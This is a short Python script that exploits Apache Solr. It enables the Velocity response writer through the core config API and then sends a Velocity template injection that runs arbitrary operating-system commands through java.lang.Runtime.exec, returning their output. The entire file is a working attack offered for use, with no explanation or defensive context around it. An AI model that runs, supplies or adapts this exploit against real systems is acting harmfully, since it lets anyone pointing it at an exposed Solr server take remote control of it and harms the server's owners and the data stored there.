import requests
import urllib
import json
import sys
def GetPath(url):
    payload=url+"solr/admin/cores?&indexInfo=false&wt=json"
    r=requests.get(url=payload).json()
    return r["status"].keys()[0]
def Config(url):
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/json'
    }
    data={
    "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
    }
    }
    requests.post(url=url,headers=headers,data=json.dumps(data)).content
def execute(url):
    return requests.get(url=url).content
if __name__=='__main__':
    url=sys.argv[1]
    command=urllib.quote(sys.argv[2])
    path=GetPath(url)
    #print path
    url1=url+'solr/'+path+'/config'
    Config(url1)
    url2=url+'solr/'+path+'/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'.format(command)
    print execute(url2)